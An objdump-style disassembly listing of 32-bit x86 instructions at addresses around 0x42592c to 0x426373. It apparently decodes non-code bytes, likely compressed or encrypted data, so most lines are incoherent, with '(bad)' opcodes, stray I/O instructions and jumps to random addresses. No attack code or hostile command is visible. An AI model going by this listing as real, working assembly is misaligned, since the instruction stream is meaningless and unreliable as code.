  42592c:	int3   
  42592d:	mov    al,al
  42592f:	or     BYTE PTR [ecx-0x4f],ch
  425932:	mov    eax,0x42854adb
  425937:	les    edi,FWORD PTR [edi-0x2d]
  42593a:	mov    eax,0xa0c129cb
  42593f:	lds    edi,FWORD PTR [ebx+ebx*1]
  425942:	mov    ah,0x42
  425944:	(bad)  
  425945:	icebp  
  425946:	jbe    0x425941
  425948:	mov    esi,0x810961fa
  42594d:	test   BYTE PTR [eax],dl
  42594f:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  425951:	(bad)  
  425952:	push   esi
  425953:	shr    DWORD PTR [edx],1
  425955:	jb     0x4258ed
  425957:	add    al,0x41
  425959:	sub    eax,0x36dc1a82
  42595e:	clc    
  42595f:	lahf   
  425960:	std    
  425961:	ss out dx,eax
  425963:	fldcw  WORD PTR [ecx-0x17d8fcb1]
  425969:	hlt    
  42596a:	daa    
  42596b:	push   edx
  42596c:	jmp    0x4259af
  42596e:	mov    eax,0xda3bda96
  425973:	cmp    ah,dl
  425975:	(bad)  
  425976:	scas   al,BYTE PTR es:[edi]
  425977:	mov    ch,0xfe
  425979:	cwde   
  42597a:	xchg   ecx,edx
  42597c:	push   ebx
  42597d:	scas   al,BYTE PTR es:[edi]
  42597e:	cmp    ah,BYTE PTR [eax+0x1996d701]
  425984:	cmp    BYTE PTR [eax+ecx*1-0x73],dl
  425988:	es mov ebp,0xcebb101
  42598e:	scas   eax,DWORD PTR es:[edi]
  42598f:	adc    ebx,DWORD PTR [esi+edx*2]
  425992:	jae    0x42598c
  425994:	in     eax,0x54
  425996:	pusha  
  425997:	in     al,dx
  425998:	cmp    edx,DWORD PTR [eax-0x68]
  42599b:	mov    al,0x4b
  42599d:	xchg   esi,eax
  42599e:	cmp    DWORD PTR [ecx],eax
  4259a0:	mov    ch,0x40
  4259a2:	pop    edi
  4259a3:	call   0x8b2b:0xa8e3eda3
  4259aa:	int3   
  4259ab:	pushf  
  4259ac:	inc    eax
  4259ad:	jmp    0xebd9426c
  4259b2:	pusha  
  4259b3:	add    BYTE PTR [ebp-0x4e],al
  4259b6:	rcl    DWORD PTR [edi+0x46107cb],0xd8
  4259bd:	mov    edi,0x55d1694
  4259c2:	cmp    ch,dl
  4259c4:	int3   
  4259c5:	xor    DWORD PTR [edx+0x5721fefc],0xb1c3b984
  4259cf:	pop    ebp
  4259d0:	scas   al,BYTE PTR es:[edi]
  4259d1:	adc    bh,BYTE PTR [esi-0x32]
  4259d4:	jp     0x4259f4
  4259d6:	fidivr DWORD PTR [edx-0x20c817ed]
  4259dc:	ins    BYTE PTR es:[edi],dx
  4259dd:	arpl   di,ax
  4259df:	mov    ch,ah
  4259e1:	push   edi
  4259e2:	inc    edi
  4259e3:	dec    eax
  4259e4:	pop    ds
  4259e5:	stos   DWORD PTR es:[edi],eax
  4259e6:	jge    0x4259fe
  4259e8:	mov    ebp,0xcfe7434c
  4259ed:	adc    al,0x1d
  4259ef:	mov    dh,0x4b
  4259f1:	les    ebx,FWORD PTR [eax-0x25a3ac34]
  4259f7:	and    BYTE PTR [ebp+0x1539bd87],bh
  4259fd:	leave  
  4259fe:	in     eax,0x56
  425a00:	scas   eax,DWORD PTR es:[edi]
  425a01:	dec    edx
  425a02:	adc    al,0x3d
  425a04:	clc    
  425a05:	cdq    
  425a06:	mov    ebx,DWORD PTR [ebx-0x75]
  425a09:	int    0xb3
  425a0b:	mov    ecx,0x9261a63b
	...
  425a74:	shl    DWORD PTR [ebx+0x4],0x67
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4-0x20f58a7c]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	imul   ebp,DWORD PTR [ebx+0x37],0x640713a9
  425a93:	xlat   BYTE PTR ds:[ebx]
  425a94:	fnstenv [eax]
  425a96:	ins    DWORD PTR es:[edi],dx
  425a97:	push   ds
  425a98:	fisubr DWORD PTR [ecx+0x7a16af91]
  425a9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425a9f:	cmp    DWORD PTR [edi-0x6b7e1ef2],edi
  425aa5:	test   al,0x5c
  425aa7:	stos   BYTE PTR es:[edi],al
  425aa8:	mov    cl,0xdc
  425aaa:	in     al,0xb9
  425aac:	out    dx,al
  425aad:	dec    ebp
  425aae:	mov    edi,DWORD PTR [ebx]
  425ab0:	mov    eax,0xe4e4efa6
  425ab5:	pop    es
  425ab6:	icebp  
  425ab7:	aad    0xdd
  425ab9:	mov    DWORD PTR [bp+di-0x16],esp
  425abd:	xchg   ecx,eax
  425abe:	add    eax,0xb8080de7
  425ac3:	ret    0x5d5c
  425ac6:	or     edi,eax
  425ac8:	xor    al,0xc3
  425aca:	mov    dh,0x1a
  425acc:	fwait
  425acd:	loop   0x425b11
  425acf:	xchg   ah,dl
  425ad1:	jge    0x425b1f
  425ad3:	or     DWORD PTR [esi-0x74],0x697b8e07
  425ada:	mov    ecx,0x5d60ab2
  425adf:	(bad)  
  425ae0:	sti    
  425ae1:	xchg   edi,eax
  425ae2:	scas   al,BYTE PTR es:[edi]
  425ae3:	bound  ebp,QWORD PTR [ebx-0xc87f33a]
  425ae9:	or     edx,DWORD PTR [edx+0x25cbb329]
  425aef:	cmp    BYTE PTR [ecx],al
  425af1:	mov    eax,ds:0x15c7f9bb
  425af6:	xchg   ecx,eax
  425af7:	xchg   edx,eax
  425af8:	dec    eax
  425af9:	mov    ds:0xab5aceaa,eax
  425afe:	mov    ds:0x87f9edaa,eax
  425b03:	mov    ebx,0x772db4ba
  425b08:	cmp    bl,BYTE PTR [eax+0x6f]
  425b0b:	dec    esp
  425b0c:	pop    edx
  425b0d:	fdiv   DWORD PTR [ecx-0xe]
  425b10:	lods   al,BYTE PTR ds:[esi]
  425b11:	(bad)  
  425b12:	cmc    
  425b13:	pusha  
  425b14:	adc    DWORD PTR [ebx+ebx*8-0x48f95116],esi
  425b1b:	bound  ebx,QWORD PTR [eax+ebx*8-0x26f33736]
  425b22:	and    DWORD PTR [edx+0x4],0x91a2c6fa
  425b29:	adc    al,BYTE PTR [eax-0x55f9889f]
  425b2f:	adc    DWORD PTR [eax+eiz*8-0x4d],edi
  425b33:	dec    ecx
  425b34:	hlt    
  425b35:	stc    
  425b36:	or     ch,BYTE PTR [edi]
  425b38:	dec    esi
  425b39:	test   BYTE PTR [ebp-0x20],0xe0
  425b3d:	mov    DWORD PTR [ecx],ebx
  425b3f:	loop   0x425add
  425b41:	xlat   BYTE PTR ds:[ebx]
  425b42:	mov    ebp,0xd192a3e3
  425b47:	out    dx,al
  425b48:	mov    dl,0xd1
  425b4a:	push   esi
  425b4b:	adc    eax,0x3e935820
  425b50:	(bad)  
  425b51:	fsubr  QWORD PTR [eax]
  425b53:	and    DWORD PTR ds:0x41644d16,esi
  425b59:	xor    DWORD PTR [edi],edx
  425b5b:	jecxz  0x425bb8
  425b5d:	mov    BYTE PTR [ecx],dl
  425b5f:	lods   al,BYTE PTR ds:[esi]
  425b60:	mov    eax,ds:0x9c43e4ce
  425b65:	call   0xb19e:0x4bfe790c
  425b6c:	sbb    BYTE PTR [edi],bh
  425b6e:	loopne 0x425b22
  425b70:	jb     0x425b2b
  425b72:	xchg   edx,eax
  425b73:	shl    DWORD PTR [esi+edi*2+0x7b],1
  425b77:	dec    ebx
  425b78:	jp     0x425bce
  425b7a:	jge    0x425b40
  425b7c:	addr16 test eax,0x7e1a9c97
  425b82:	xor    BYTE PTR [edx+0xa958026],dl
  425b88:	inc    esp
  425b89:	cmp    bh,0x10
  425b8c:	aaa    
  425b8d:	push   edx
  425b8e:	adc    eax,0xf3
	...
  425bf3:	add    ah,al
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	lds    edx,FWORD PTR [edi+ebx*4]
  425c03:	aaa    
  425c04:	aam    0x92
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	add    bl,0x29
  425c0f:	jno    0x425c4a
  425c11:	test   WORD PTR [edx+0x50c538a4],bp
  425c18:	xor    BYTE PTR [eax],al
  425c1a:	shr    DWORD PTR [ecx],cl
  425c1c:	and    eax,0x19b39a94
  425c21:	xor    esi,DWORD PTR [edi]
  425c23:	jns    0x425c38
  425c25:	ins    BYTE PTR es:[edi],dx
  425c26:	and    eax,0xe85095d4
  425c2b:	cmp    cl,bl
  425c2d:	sar    DWORD PTR [edi],0xe4
  425c30:	test   eax,0x5c9154a5
  425c35:	xlat   BYTE PTR ds:[ebx]
  425c36:	dec    DWORD PTR [edi+ebx*1]
  425c39:	sub    esi,esi
  425c3b:	out    0xb3,eax
  425c3d:	pop    ebp
  425c3e:	xor    eax,DWORD PTR [ecx]
  425c40:	pop    edx
  425c41:	jmp    0xbdd435b4
  425c46:	pop    ecx
  425c47:	add    BYTE PTR [ebx+0x5db4e5f1],0xca
  425c4e:	test   ebx,ebp
  425c50:	pop    ecx
  425c51:	push   ss
  425c52:	xor    edi,edi
  425c54:	imul   eax,DWORD PTR [ebx+0x5956c376],0x274a8605
  425c5e:	pop    esp
  425c5f:	retf   0xe207
  425c62:	outs   dx,BYTE PTR ds:[esi]
  425c63:	push   cs
  425c64:	push   ss
  425c65:	out    dx,eax
  425c66:	rcl    DWORD PTR [esi+0x3f],0x10
  425c6a:	xchg   dh,ah
  425c6c:	xor    eax,0x51362a6d
  425c71:	fsub   QWORD PTR [ebp+0x18e903a0]
  425c77:	cwde   
  425c78:	test   al,0x4f
  425c7a:	ins    BYTE PTR es:[edi],dx
  425c7b:	fimul  DWORD PTR [esi+edx*4+0x649863fc]
  425c82:	fadd   QWORD PTR [ecx]
  425c84:	hlt    
  425c85:	rol    BYTE PTR ds:0xb86d19d6,1
  425c8b:	pop    ebx
  425c8c:	(bad)  
  425c8d:	in     al,0x8c
  425c8f:	loopne 0x425ca2
  425c91:	mov    ebp,0xe8f176be
  425c96:	jne    0x425c72
  425c98:	add    al,0x9e
  425c9a:	fistp  DWORD PTR [ebx]
  425c9c:	out    0xae,eax
  425c9e:	scas   eax,DWORD PTR es:[edi]
  425c9f:	fbstp  TBYTE PTR [ecx]
  425ca1:	lds    esi,FWORD PTR ds:0x9dcbc4f4
  425ca7:	push   ebx
  425ca8:	xchg   BYTE PTR [ebx+eiz*2-0x14],dh
  425cac:	je     0x425cfc
  425cae:	cmp    BYTE PTR [ebx],dh
  425cb0:	mov    ebx,0xe9e966f1
  425cb5:	mov    ebp,0xa6ffdffe
  425cba:	jl     0x425c9e
  425cbc:	ret    0x833
  425cbf:	jecxz  0x425ca2
  425cc1:	push   esi
  425cc2:	daa    
  425cc3:	xchg   BYTE PTR [eax],cl
  425cc5:	jp     0x425d00
  425cc7:	push   esi
  425cc8:	xchg   edx,eax
  425cc9:	test   eax,0x7f26e143
  425cce:	sbb    DWORD PTR [ebx],0x62
  425cd1:	fimul  WORD PTR [edi+0x5e8d696c]
  425cd7:	popf   
  425cd8:	shl    BYTE PTR [eax],1
  425cda:	data16 lahf 
  425cdc:	gs aaa 
  425cde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425cdf:	outs   dx,DWORD PTR ds:[esi]
  425ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ce1:	mov    bh,0x6d
  425ce3:	or     edi,DWORD PTR ds:0xf263f9f8
  425ce9:	cmp    DWORD PTR [ebx],eax
  425ceb:	xchg   esp,eax
  425cec:	or     dh,0xa0
  425cef:	inc    ebp
  425cf0:	or     al,0xb1
  425cf2:	out    dx,al
  425cf3:	fidiv  DWORD PTR [ecx-0x40a11110]
  425cf9:	and    DWORD PTR ds:0x5aa48679,0x0
  425d00:	mov    edi,0x20913915
  425d05:	mov    ah,0x6
  425d07:	jl     0x425ce4
  425d09:	shr    DWORD PTR [edi],1
  425d0b:	fidivr DWORD PTR [esi+0xcc2c72]
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0xf169aa29,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	aaa    
  425d8d:	adc    DWORD PTR [ecx],edx
  425d8f:	daa    
  425d90:	adc    eax,ebx
  425d92:	sti    
  425d93:	nop
  425d94:	aaa    
  425d95:	lea    edi,[edx+0x5b]
  425d98:	mov    BYTE PTR [edx],ah
  425d9a:	and    dl,BYTE PTR [edx-0x19]
  425d9d:	jnp    0x425d22
  425d9f:	jmp    0xa64086ed
  425da4:	pop    esp
  425da5:	(bad)  
  425da6:	jae    0x425d86
  425da8:	and    ah,ch
  425daa:	loopne 0x425e0e
  425dac:	add    al,0x9a
  425dae:	test   BYTE PTR [esi-0x4e1beb38],0x84
  425db5:	push   0xe7532341
  425dba:	ss sub ebp,ecx
  425dbd:	dec    edi
  425dbe:	int3   
  425dbf:	xchg   ebp,eax
  425dc0:	jl     0x425e1a
  425dc2:	inc    ebp
  425dc3:	mov    edi,0x2f7c394d
  425dc8:	adc    eax,0xfa660834
  425dcd:	add    BYTE PTR [edx-0x239848ca],bl
  425dd3:	out    dx,eax
  425dd4:	pop    edi
  425dd5:	mov    cl,BYTE PTR [edi]
  425dd7:	into   
  425dd8:	cwde   
  425dd9:	aam    0xdc
  425ddb:	sbb    DWORD PTR [ebp+0x3],ecx
  425dde:	stc    
  425ddf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425de0:	cld    
  425de1:	scas   al,BYTE PTR es:[edi]
  425de2:	out    dx,al
  425de3:	pop    edi
  425de4:	mov    dh,0x64
  425de6:	aaa    
  425de7:	ins    BYTE PTR es:[edi],dx
  425de8:	call   0x8061cc69
  425ded:	pop    ds
  425dee:	cld    
  425def:	ret    
  425df0:	shl    DWORD PTR [ebx-0x6d],0xca
  425df4:	mov    ds:0xc49a60e,eax
  425df9:	mov    ebx,0x55a6ae19
  425dfe:	jnp    0x425e28
  425e00:	call   FWORD PTR [eax+0x1267f54a]
  425e06:	cmp    al,0x76
  425e08:	xor    bl,dl
  425e0a:	fild   QWORD PTR [edx]
  425e0c:	inc    eax
  425e0d:	dec    ecx
  425e0e:	scas   al,BYTE PTR es:[edi]
  425e0f:	gs popa 
  425e11:	pop    es
  425e12:	adc    eax,0xf5b68141
  425e17:	push   edx
  425e18:	mov    ecx,0x5607c719
  425e1d:	jne    0x425de4
  425e1f:	dec    eax
  425e20:	lock sub al,0xcb
  425e23:	scas   al,BYTE PTR es:[edi]
  425e24:	retf   
  425e25:	dec    esp
  425e26:	mov    cs,WORD PTR [edx-0x58a5d525]
  425e2c:	mov    ?,WORD PTR [ebp+0x6e]
  425e2f:	enter  0x8690,0x3e
  425e33:	nop
  425e34:	pop    ss
  425e35:	sub    ch,BYTE PTR [esi]
  425e37:	pop    ebp
  425e38:	sbb    al,0x85
  425e3a:	push   es
  425e3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e3c:	std    
  425e3d:	in     eax,0x9a
  425e3f:	pop    ebp
  425e40:	and    dh,ch
  425e42:	aas    
  425e43:	jp     0x425e78
  425e45:	jnp    0x425de3
  425e47:	sahf   
  425e48:	push   edi
  425e49:	cmp    DWORD PTR [eax],ebp
  425e4b:	shr    DWORD PTR [ecx+0x41aea66f],cl
  425e51:	dec    ecx
  425e52:	test   DWORD PTR [ecx-0x4b],ebx
  425e55:	xor    BYTE PTR [esp+eax*1],0x82
  425e59:	xor    al,0x82
  425e5b:	add    DWORD PTR [edx-0x72],ecx
  425e5e:	fucom  st(4)
  425e60:	(bad)  
  425e61:	(bad)  
  425e62:	jae    0x425df1
  425e64:	or     DWORD PTR [ebx+0x3c],eax
  425e67:	lea    esi,[ecx+0x1e]
  425e6a:	mov    ah,ch
  425e6c:	xor    esp,DWORD PTR [eax+edx*1+0x5c]
  425e70:	cli    
  425e71:	imul   edi,DWORD PTR [esi+0x33a23369],0x6afa4af8
  425e7b:	mov    ch,0x34
  425e7d:	push   edx
  425e7e:	mov    dl,0x92
  425e80:	loop   0x425e88
  425e82:	out    0x9b,eax
  425e84:	cli    
  425e85:	repnz push ebx
  425e87:	dec    edx
  425e88:	pop    edi
  425e89:	push   edi
  425e8a:	dec    esp
  425e8b:	cmp    eax,0x5242bf7
	...
  425ef4:	(bad)  
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	(bad)  
  425f01:	test   DWORD PTR [eax-0x80],eax
  425f04:	fcom   QWORD PTR [ecx+eax*1+0x10400]
  425f0b:	add    BYTE PTR [eax],ah
  425f0d:	adc    eax,0x3f493baa
  425f12:	and    BYTE PTR [edx],0x4b
  425f15:	leave  
  425f16:	shl    BYTE PTR [ecx+0x2f],1
  425f19:	dec    ebp
  425f1a:	cmp    BYTE PTR [esi+eiz*4],cl
  425f1d:	aas    
  425f1e:	stos   BYTE PTR es:[edi],al
  425f1f:	call   0xcbc7:0x67800d61
  425f26:	punpckhdq mm0,mm2
  425f29:	in     al,dx
  425f2a:	ins    BYTE PTR es:[edi],dx
  425f2b:	pushf  
  425f2c:	fdivr  DWORD PTR [ebx+0x71]
  425f2f:	daa    
  425f30:	das    
  425f31:	jae    0x425eb6
  425f33:	aas    
  425f34:	pop    edi
  425f35:	or     ch,ah
  425f37:	xor    eax,esp
  425f39:	cld    
  425f3a:	mov    dl,0xf
  425f3c:	mov    cl,0x14
  425f3e:	adc    dl,al
  425f40:	out    dx,eax
  425f41:	repnz outs dx,BYTE PTR ds:[esi]
  425f43:	popf   
  425f44:	mov    ch,BYTE PTR [esi-0x37]
  425f47:	sbb    al,0x7b
  425f49:	xchg   ebp,edx
  425f4b:	repnz mov ecx,0x9f21f1f
  425f51:	outs   dx,DWORD PTR ds:[esi]
  425f52:	push   ebp
  425f53:	inc    eax
  425f54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f55:	rol    BYTE PTR [ecx-0x2ad8779f],cl
  425f5b:	add    ebx,DWORD PTR [ecx+0x68]
  425f5e:	push   ecx
  425f5f:	into   
  425f60:	mov    BYTE PTR [ebx-0x425e8890],dh
  425f66:	hlt    
  425f67:	add    DWORD PTR [eax],ebx
  425f69:	mov    ah,BYTE PTR [ecx]
  425f6b:	pop    edx
  425f6c:	loop   0x425f6a
  425f6e:	mul    BYTE PTR ds:0xbc70df8e
  425f74:	push   ebp
  425f75:	push   ecx
  425f76:	aam    0x13
  425f78:	stos   BYTE PTR es:[edi],al
  425f79:	fcomi  st,st(0)
  425f7b:	aad    0x1e
  425f7d:	into   
  425f7e:	(bad)  
  425f7f:	mov    ebx,0x27c59eba
  425f84:	mov    cl,BYTE PTR [eax-0x3b]
  425f87:	sbb    ah,BYTE PTR [eax-0x8]
  425f8a:	shr    DWORD PTR [ecx-0x7d],cl
  425f8d:	stos   BYTE PTR es:[edi],al
  425f8e:	jge    0x425f7a
  425f90:	popa   
  425f91:	mov    eax,ds:0xd759770f
  425f96:	mov    ecx,0xb843ff58
  425f9b:	(bad)  
  425f9c:	sar    DWORD PTR [ebp+0x42],cl
  425f9f:	jl     0x425f81
  425fa1:	push   ss
  425fa2:	sbb    BYTE PTR [ebp-0x1e489379],dh
  425fa8:	adc    al,0xf4
  425faa:	dec    esp
  425fab:	out    dx,al
  425fac:	dec    esi
  425fad:	pop    ebp
  425fae:	mov    al,0xfe
  425fb0:	inc    ecx
  425fb1:	xchg   ebx,eax
  425fb2:	add    eax,0x86baf7f9
  425fb7:	enter  0xf05d,0x1e
  425fbb:	adc    al,0xc6
  425fbd:	test   DWORD PTR [ebx+ecx*1-0x42e7c1ea],ebx
  425fc4:	push   eax
  425fc5:	mov    edx,0x4897471d
  425fca:	mov    esp,0xec90a913
  425fcf:	cmp    dh,BYTE PTR [ecx]
  425fd1:	inc    ebx
  425fd2:	inc    esi
  425fd3:	ss jne 0x425f74
  425fd6:	mov    cl,0x9a
  425fd8:	sub    dl,bh
  425fda:	sti    
  425fdb:	dec    esp
  425fdc:	stos   BYTE PTR es:[edi],al
  425fdd:	xor    DWORD PTR [ebx+0x412a2006],ebx
  425fe3:	cmp    DWORD PTR [edx+0x6c],ecx
  425fe6:	mov    BYTE PTR [ebx-0x68],bh
  425fe9:	xor    eax,0x11a813c1
  425fee:	and    BYTE PTR [edi+0x37],bl
  425ff1:	and    bl,0x88
  425ff4:	shr    DWORD PTR [eax+0x24],1
  425ff7:	arpl   WORD PTR [eax+edi*8+0x5c],sp
  425ffb:	cli    
  425ffc:	xchg   dh,al
  425ffe:	inc    eax
  425fff:	sbb    bl,bl
  426001:	push   ebx
  426002:	stos   DWORD PTR es:[edi],eax
  426003:	inc    eax
  426004:	push   ebx
  426005:	mov    bl,0x2b
  426007:	push   es
  426008:	(bad)  
  426009:	in     al,0x11
  42600b:	push   esp
  42600c:	mov    ecx,DWORD PTR [edi]
  42600e:	lock xor al,0x0
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	mov    al,0x25
  426082:	in     al,dx
  426083:	sub    al,0xe0
  426085:	xchg   ebp,eax
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	(bad)  
  42608d:	out    dx,al
  42608e:	mov    ebp,0xf80536f5
  426093:	cdq    
  426094:	cs loopne 0x4260fc
  426097:	jae    0x426063
  426099:	stc    
  42609a:	adc    esp,DWORD PTR [eax]
  42609c:	push   eax
  42609d:	sub    DWORD PTR [edi-0x60fc645a],0xeb1c85e
  4260a7:	mov    edi,0xd3600566
  4260ac:	xor    DWORD PTR [eax+ebp*1-0x4d441b35],0xffffff9a
  4260b4:	aaa    
  4260b5:	mov    ds:0x4e33e167,al
  4260ba:	or     dl,BYTE PTR [edi+0x1d]
  4260bd:	bnd jmp 0x88e267ca
  4260c3:	rcr    DWORD PTR [eax+0x8],1
  4260c6:	mov    dh,0x5f
  4260c8:	inc    esp
  4260c9:	push   ss
  4260ca:	(bad)  
  4260cc:	(bad)  [edi+0x6a]
  4260cf:	adc    al,0x59
  4260d1:	jge    0x4260d8
  4260d3:	and    al,0xc4
  4260d5:	xchg   esi,eax
  4260d6:	cmp    edi,esp
  4260d8:	adc    al,0x63
  4260da:	pop    ecx
  4260db:	push   0xffffffe6
  4260dd:	adc    eax,0x111da1af
  4260e2:	and    al,0x89
  4260e4:	lea    ebp,[edx-0x35]
  4260e7:	addr16 adc al,0xb8
  4260ea:	fdiv   DWORD PTR [ebx-0x12f85680]
  4260f0:	mov    ebx,0x357edfb6
  4260f5:	pop    esi
  4260f6:	jmp    0x4260f8
  4260f8:	sub    al,0x63
  4260fa:	sbb    BYTE PTR [esi-0x6a],cl
  4260fd:	popa   
  4260fe:	and    ecx,edx
  426100:	adc    edi,ebx
  426102:	or     ch,BYTE PTR [eax-0x7169c20b]
  426108:	mov    esi,0x195d92d0
  42610d:	(bad)  [esi+0x3676ffac]
  426113:	mov    dh,0x9
  426115:	cs loope 0x4260cc
  426118:	sbb    DWORD PTR [esi+0x5d],esi
  42611b:	not    BYTE PTR [esi]
  42611d:	test   BYTE PTR [ebx+0x66],cl
  426120:	sahf   
  426121:	leave  
  426122:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426123:	pop    DWORD PTR [ebp+0x3e]
  426126:	sti    
  426127:	jb     0x42613a
  426129:	mov    esi,0x2a89852f
  42612e:	loopne 0x426149
  426130:	jg     0x4260cd
  426132:	fiadd  WORD PTR [ebx+0x5e]
  426135:	retf   0xe017
  426138:	adc    eax,0x7cd3f56a
  42613d:	sbb    BYTE PTR [edx-0x48152c49],dl
  426143:	or     BYTE PTR [edi+eax*4],ah
  426146:	arpl   WORD PTR [esp+edi*1],si
  426149:	push   bp
  42614b:	and    ebx,esp
  42614d:	scas   al,BYTE PTR es:[edi]
  42614e:	fimul  WORD PTR [eax-0x51]
  426151:	sub    DWORD PTR [ebp-0x90db4fb],ecx
  426157:	stos   BYTE PTR es:[edi],al
  426158:	daa    
  426159:	push   ebx
  42615a:	xor    bl,0x3
  42615d:	retf   0x3e8b
  426160:	mov    WORD PTR [edx],?
  426162:	add    dh,BYTE PTR [esi]
  426164:	and    eax,0x5836ae4b
  426169:	cmp    eax,edi
  42616b:	ins    DWORD PTR es:[edi],dx
  42616c:	and    al,0x56
  42616e:	xchg   DWORD PTR [ecx+0x679d3eff],ebp
  426174:	push   ecx
  426175:	sbb    BYTE PTR [ebp-0x57],0xed
  426179:	mov    BYTE PTR ds:0x4114ad3e,bl
  42617f:	mov    cl,0x5f
  426181:	loope  0x4261a7
  426183:	(bad)  
  426184:	push   ds
  426185:	xor    eax,0xa04b48ed
  42618a:	adc    BYTE PTR [ebx-0x4093cbff],dh
	...
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx+0x37165927],0x7a
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	xchg   esp,eax
  42620d:	inc    ebx
  42620e:	les    edx,FWORD PTR [edi+0x48b4ccfc]
  426214:	leave  
  426215:	imul   esp,DWORD PTR [ecx+0x58],0xb950b2a6
  42621c:	mov    eax,DWORD PTR [edx-0x207ae460]
  426222:	xchg   edx,eax
  426223:	and    BYTE PTR [ebx+0x55c5ad22],0xe1
  42622a:	jno    0x426204
  42622c:	jne    0x4262a3
  42622e:	push   esp
  42622f:	pop    ebp
  426230:	sub    DWORD PTR [ecx+0x71c69a8c],esp
  426236:	fucomip st,st(2)
  426238:	adc    eax,eax
  42623a:	mov    esp,0x4233e5e6
  42623f:	sbb    BYTE PTR [esi-0x23],ch
  426242:	add    ebx,esi
  426244:	frstor [edi]
  426246:	or     DWORD PTR ds:0xcf7a4428,esi
  42624c:	ss daa 
  42624e:	pop    edx
  42624f:	or     al,0x76
  426251:	jnp    0x42627a
  426253:	push   eax
  426254:	adc    BYTE PTR [esi-0x2291e0a0],dh
  42625a:	or     al,0xc9
  42625c:	pushf  
  42625d:	adc    dl,ch
  42625f:	dec    edi
  426260:	jle    0x426288
  426262:	arpl   WORD PTR [ebp-0x69],ax
  426265:	xchg   esp,eax
  426266:	aam    0xd7
  426268:	call   0x9256:0xa3f8bf1e
  42626f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426270:	fs ins DWORD PTR es:[edi],dx
  426272:	adc    eax,0xc1f5a87f
  426277:	mov    ds:0xe917907f,eax
  42627c:	mov    ds:0xc688573a,eax
  426281:	inc    ecx
  426282:	cdq    
  426283:	out    dx,eax
  426284:	icebp  
  426285:	adc    eax,0x611078ce
  42628a:	mov    gs,WORD PTR ds:0x13103232
  426290:	push   0xe01a2acd
  426295:	and    edi,DWORD PTR [eax+0x3d21633a]
  42629b:	cmp    al,0x3f
  42629d:	adc    DWORD PTR [ebx+0x136aa7cb],0x94c800b3
  4262a7:	dec    ebx
  4262a8:	sbb    dl,dh
  4262aa:	xchg   ebp,eax
  4262ab:	dec    eax
  4262ac:	sbb    bl,0x9d
  4262af:	cmp    ebx,DWORD PTR [ebx-0x7923d67f]
  4262b5:	and    esp,DWORD PTR [esi-0x37c12b0e]
  4262bb:	or     ebx,DWORD PTR [edi+0x1e]
  4262be:	ror    BYTE PTR [ebx+0x10],1
  4262c1:	loopne 0x4262fe
  4262c3:	int3   
  4262c4:	push   ebp
  4262c5:	shr    BYTE PTR [esp+esi*1],0x7a
  4262c9:	aam    0x1d
  4262cb:	retf   0x436a
  4262ce:	repnz sbb DWORD PTR [edx+esi*1+0x37],edi
  4262d3:	stos   BYTE PTR es:[edi],al
  4262d4:	sti    
  4262d5:	inc    edi
  4262d6:	pop    esi
  4262d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262d8:	cdq    
  4262d9:	pop    ds
  4262da:	nop
  4262db:	mov    esp,0x45387ce
  4262e0:	jne    0x426331
  4262e2:	retf   
  4262e3:	cmc    
  4262e4:	cli    
  4262e5:	mov    dl,0xf6
  4262e7:	lahf   
  4262e8:	and    ah,BYTE PTR [edi+ecx*1]
  4262eb:	retf   0x5f56
  4262ee:	pop    es
  4262ef:	ret    0xa038
  4262f2:	outs   dx,DWORD PTR ds:[esi]
  4262f3:	and    al,0x93
  4262f5:	xchg   dl,dh
  4262f7:	pushf  
  4262f8:	sahf   
  4262f9:	(bad)  
  4262fb:	dec    ebx
  4262fc:	inc    ebp
  4262fd:	push   ds
  4262fe:	arpl   WORD PTR [eax-0x70cc886c],si
  426304:	push   0x3c957871
  426309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42630a:	inc    edi
  42630b:	stc    
  42630c:	les    ecx,FWORD PTR [esi]
  42630e:	mov    esi,0x3f
	...
  426373:	add    BYTE PTR [ebp+eiz*1-0x73],dl
